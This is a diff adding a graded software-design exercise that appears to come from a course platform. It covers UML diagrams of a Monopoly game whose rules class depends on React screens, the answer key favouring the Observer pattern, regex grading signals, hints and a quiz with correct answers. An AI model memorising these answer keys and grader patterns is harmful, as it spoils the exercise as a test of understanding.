+              + balance: number
+            }
+            class TvBoardView <<React component>> {
+              + redraw(board)
+            }
+            class PhoneView <<React component>> {
+              + showBalance(players)
+            }
+            Game --> Player
+            Game --> TvBoardView
+            Game --> PhoneView
+            note right of Game
+            Every rule lives in Game, and
+            payRent() updates each screen,
+            so no screen misses a change.
+            end note
+            @enduml
+        - id: monopoly-pay-rent
+          type: sequence
+          label: "Ana pays rent (sequence diagram)"
+          source: |
+            @startuml
+            layout compact
+            participant anaPhone: PhoneView
+            participant game: Game
+            participant tv: TvBoardView
+            participant phone[i]: PhoneView
+            note right of anaPhone
+            Ana taps "Pay rent"
+            for Royce Hall.
+            end note
+            anaPhone -> game: payRent(ana, ben, 200)
+            activate game
+            game -> tv: redraw(board)
+            loop [for each phone in phones]
+            game -> phone[i]: showBalance(players)
+            end
+            deactivate game
+            note right of game
+            All four screens update in
+            one call, well within 1 s.
+            end note
+            @enduml
+      key:
+        flaw: "Game, the class with the game rules, holds the concrete UI classes (tv: TvBoardView, phones: PhoneView[]), and payRent() calls redraw() and showBalance() itself, so the rules depend on the UI instead of the UI depending on the rules."
+        consequence: "Adding a spectator TV or a text UI for tests means editing Game: a new field and new calls in payRent(), endTurn(), and every rule that changes a balance. The rules cannot run in a test without the React screens, and each new screen changes the rules, breaking the second criterion."
+        fix: "Make Game a Subject: screens implement an observer interface such as GameObserver.onBalanceChanged() and register with Game; payRent() only calls notify(), and screens read balances through getters, so a new screen only registers and Game never names a UI class."
+        accept_fixes:
+          - "Game publishes events or callbacks (such as onBalanceChanged) that screens subscribe to"
+          - "screens register listeners with Game and pull state through getters"
+      signals:
+        flaw: ["\\bui\\b", "react", "view", "screen", "presentation", "front[- ]?end", "display", "domain", "separat", "coupl", "depend", "concern"]
+        consequence: ["spectator", "text ui", "\\btests?\\b", "edit", "modif", "chang\\w* (game|the rules|payrent|endturn)", "new (field|attribute|call)", "every (new )?(screen|view)", "without (the |a )?(ui|react|screen)", "second (criterion|tv|acceptance)"]
+        fix: ["observer", "subject", "subscri", "register", "listen", "callback", "notify", "event", "on ?balance ?changed", "interface", "getter", "pub(lish)?[/ -]?sub"]
+      anchors:
+        - { label: "payRent()", pattern: "pay ?rent" }
+        - { label: "TvBoardView", pattern: "tv ?board ?view" }
+        - { label: "PhoneView", pattern: "phone ?view" }
+        - { label: "redraw() or showBalance()", pattern: "redraw|show ?balance" }
+        - { label: "the tv and phones fields of Game", pattern: "\\b(tv|phones)\\s*(:|field|attribute)" }
+      coach:
+        flaw:
+          - "Look at what `Game`, the class with the rules, knows about. Which of those classes are screens?"
+          - "Find the fields of `Game` in the class diagram and the calls of `payRent()` in the sequence diagram. Which of them name React components, and which way should that dependency point?"
+        consequence:
+          - "Pick one new screen from the Given. Which existing class has to change before it can show a balance?"
+          - "List what changes inside `Game` for the spectator TV (fields, and calls in `payRent()` and `endTurn()`), then ask whether the rules could run in a test with no React component at all."
+        fix:
+          - "Propose who should know about whom: should the rules know the screens, or the screens know the rules?"
+          - "What could a screen hand to `Game` when it opens, so that `Game` can tell it about a change without knowing its class?"
+      wrong_claims:
+        - patterns: ["too many (methods|operations|responsibilit)", "god class", "single responsibility", "too big", "split game"]
+          note: "Every operation of `Game` is a game rule, so its size is not the issue. Ask which classes those rules depend on."
+        - patterns: ["websocket", "socket", "network", "latency", "real[- ]?time"]
+          note: "How updates travel to the phones is a detail below this design, and the sequence diagram already meets the 1 s criterion. Look at what `Game` must know about each screen."
+        - patterns: ["(should be|use) a set", "set instead of (a )?(list|array)"]
+          note: "Whether `phones` is a list or a set changes nothing when a new kind of screen arrives."
+        - patterns: ["(don'?t|not|without|instead of) (use )?react", "angular", "\\bvue\\b", "svelte"]
+          note: "React is a fine choice for the screens. The question is whether the game rules depend on the screens, whatever framework draws them."
+      lesson:
+        principle: "Separate the Domain Logic From the UI"
+        definition: |
+          **Separation of concerns:** a system "should be divided into distinct sections, or concerns, where each section addresses a separate, specific goal, purpose, or responsibility." The layer with the game rules "doesn't have a clue that there even is a UI": it lets the presentation layer register a callback for state changes (such as `onBalanceChanged`), retrieve information through getters, and forward user events. The **Observer** pattern maintains this one-to-many dependency "without making the objects tightly coupled".
+        ask: |
+          **Ask:** could this rule run with no UI at all?
+        flaw: |
+          `Game` holds `tv: TvBoardView` and `phones: PhoneView[]`, and `payRent()` calls `redraw()` and `showBalance()` itself. The rules depend on two React components, so a spectator TV or a text UI for tests means editing `Game`, and no test of the rules can run without the screens. The class diagram shows this dependency directly; the sequence diagram shows only one run of it.
+        fix: |
+          Make `Game` a Subject: each screen implements `GameObserver` with `onBalanceChanged()`, calls `game.register(this)` when it opens, and reads balances with `getBalance()`. `payRent()` updates the balances and calls `notify()`. A spectator TV or a test's text UI is one more observer, and `Game` does not change.
+        more: |
+          The sequence diagram looked right: one `payRent()` call updates all four screens, well within 1 s. The problem is a dependency, and a change question like the Given's is answered by the view made for change impact analysis: the class diagram.
+      annotated:
+        label: "The flaw, annotated"
+        type: class
+        source: |
+          @startuml
+          layout compact
+          class Game #FFE0B2 {
+            - players: Player[]
+            - tv: TvBoardView
+            - phones: PhoneView[]
+            + payRent(from, to, amount)
+            + endTurn()
+          }
+          class Player {
+            + balance: number
+          }
+          class TvBoardView <<React component>> #FFE0B2 {
+            + redraw(board)
+          }
+          class PhoneView <<React component>> #FFE0B2 {
+            + showBalance(players)
+          }
+          Game --> Player
+          Game --> TvBoardView
+          Game --> PhoneView
+          note right of Game
+          Every rule lives in Game, and
+          payRent() updates each screen,
+          so no screen misses a change.
+          end note
+          callout left of text "-tv: TvBoardView" : The game rules hold two React components, so each new kind of screen changes Game.
+          callout bottom of text "+payRent(from, to, amount)" : payRent() calls the screens itself: the rules cannot run without a UI.
+          @enduml
+      fixed:
+        label: "The fixed design"
+        type: class
+        source: |
+          @startuml
+          layout compact
+          class Game {
+            - observers: GameObserver[]
+            + register(o: GameObserver)
+            + getBalance(player): number
+            + payRent(from, to, amount)
+            - notify()
+          }
+          interface GameObserver {
+            + onBalanceChanged()
+          }
+          class TvBoardView <<React component>>
+          class PhoneView <<React component>>
+          class SpectatorView <<React component>>
+          Game --> GameObserver
+          TvBoardView ..|> GameObserver
+          PhoneView ..|> GameObserver
+          SpectatorView ..|> GameObserver
+          note bottom of SpectatorView
+          New screen: one more observer.
+          Game does not change.
+          end note
+          @enduml
+    quiz:
+      title: "Step 10 — Knowledge Check"
+      min_score: 0.8
+      questions:
+        - type: single
+          difficulty: intermediate
+          question: "After the fix, `Game` in the Bruin Monopoly design is a Subject: screens register as observers, and `payRent()` calls `notify()`. Which automated test checks that `payRent()` tells the screens about the new balances, with no UI at all?"
+          options:
+            - "Register a test spy as an observer, call `payRent()`, and assert what the spy recorded."
+            - "Render `TvBoardView` in a headless browser and read the balances off the screen."
+            - "Register a stub observer that returns the expected balances, and assert on its reply."
+            - "Assert on the value `payRent()` returns, since `Game` no longer calls any screen."
+          correct_index: 0
+          option_feedback:
+            1: "A browser test can work, but it needs the React screens, which is exactly what the separation removed from the tests of the rules."
+            2: "A stub controls inputs that flow into the code under test; the notification is an output of `payRent()`, so the test needs a double that records it."
+            3: "`payRent()` reports the change through `notify()`, not through its return value, so asserting on the return value checks nothing about the screens."
+          explanation: "The notification is an indirect output of `payRent()`. A test spy registered as an observer records it, so the test can assert that it arrived with the new balances, and the rules run without any UI."
+        - type: single
+          difficulty: advanced
+          question: "An AI agent's UML class diagram for a music app shows `Playlist`, the domain class that skips, shuffles, and queues tracks, with the fields `nowPlaying: NowPlayingWidget` and `lockScreen: LockScreenControls`. Its `next()` calls `nowPlaying.refresh()` and `lockScreen.update()`. Which change separates the domain logic from the UI?"
+          options:
+            - "Widgets register as `PlaylistObserver`s, and `next()` notifies whoever registered."
+            - "Both widgets extend one `ReactWidget` class, and `Playlist` keeps a `ReactWidget[]`."
+            - "Move the skip and shuffle rules into the widgets, so `Playlist` only stores tracks."
+            - "Send `refresh()` and `update()` over a WebSocket, so the widgets update in real time."
+          correct_index: 0
+          option_feedback:
+            1: "One base class removes a field but not the dependency: `Playlist` still names a UI type and still calls the widgets itself."
+            2: "Moving the rules into the widgets spreads them across the UI, so each new widget would need its own copy of the rules."
+            3: "A WebSocket changes how the call travels, not who depends on whom: `Playlist` would still have to know every widget."
+          explanation: "With an observer interface, `Playlist` only announces that something changed; each widget registers itself and reads the new state. A new widget is one more observer, and the playlist rules run without any UI."
+        - type: single
+          difficulty: intermediate
+          question: "A reviewer of the Bruin Monopoly design asks: “If we add a spectator screen, which classes must change?” Which UML view answers that question most directly?"
+          options:
+            - "A class diagram, because it shows which classes depend on which"
+            - "A sequence diagram, because it shows which messages reach each screen"
+            - "A state machine diagram, because it shows the states of the game"
+            - "A component diagram, because it shows the processes at run time"
+          correct_index: 0
+          option_feedback:
+            1: "A sequence diagram shows one run in order, which suits timing questions like the 1 s criterion; a change can touch calls that this one run never shows."
+            2: "States and transitions describe how the game behaves over time, not which classes have to be edited."
+            3: "A component-and-connector view shows runtime units and how they communicate; the question asks which code, here classes, must change."
+          explanation: "Change impact analysis is what the module view (here, the class diagram) is for: follow the dependencies of the changed part and count the classes that change with it, the same question that tells whether a design hides what is likely to change."
+        - type: single
+          difficulty: advanced
+          question: "An AI agent's UML component diagram for a ticketing app shows `TicketIssuer` and `GateScanner` with no connector between them. Both build or parse the same QR text, `event|seat|signature`. The club plans to add the buyer's name to the QR code. Which design change keeps that change in one place?"
+          options:
+            - "Give both components one `QrCodec` module that owns the QR format."
+            - "Draw a connector between the two components in the diagram."
+            - "Let `TicketIssuer` call `GateScanner` to check each new code it makes."
+            - "Document the QR format separately in each component's README."
+          correct_index: 0
+          option_feedback:
+            1: "A connector makes the dependency visible, which helps reviewers, but the format would still be written twice and change in two places."
+            2: "A call adds a syntactic dependency but leaves both components encoding the format themselves, so a format change still edits both."
+            3: "Documenting what the shared data means helps the two teams agree, but two copies of the format still have to change together, and the documents can drift apart."
+          explanation: "The two components share a design decision, so they have a semantic dependency that no connector shows: a change in one breaks the other. Hiding the format in one module makes that dependency explicit and keeps the change in one place."
